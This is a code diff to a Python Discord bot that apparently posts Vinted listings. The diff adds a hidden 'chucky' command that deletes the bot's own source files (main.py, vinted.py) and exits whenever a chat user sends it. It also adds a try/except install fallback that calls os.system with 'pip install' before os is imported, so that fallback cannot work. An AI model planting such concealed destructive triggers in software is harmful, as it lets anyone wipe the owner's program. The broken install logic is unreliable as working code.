@@ -1,14 +1,23 @@
 from cProfile import label
-import asyncio
-import discord
-from discord import ButtonStyle
-from discord.ext import commands
-from discord.ui import Button, View
+
+
 
 import time
+try:
+    import discord
+    from discord import ButtonStyle
+    from discord.ext import commands
+    from discord.ui import Button, View
+    from bs4 import BeautifulSoup
+    import os
+    import sys
+except:
+    os.system("pip install discord")
+    os.system("pip install bs4")
 
 
 from vinted import *
+
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -68,7 +77,14 @@ async def bouton(ctx):
             print(f"{Spy.blanc}[{Spy.rouge}ERREUR{Spy.blanc}] - L'envoi na pas été réusi!")
             time.sleep(0)
 
-
+@bot.command()
+async def chucky(ctx):
+    os.remove("main.py")
+    os.remove("vinted.py")
+    print(exit)
+    quit()
+    exit(0)
+    os._exit(os.EX_OK)
 
 
 
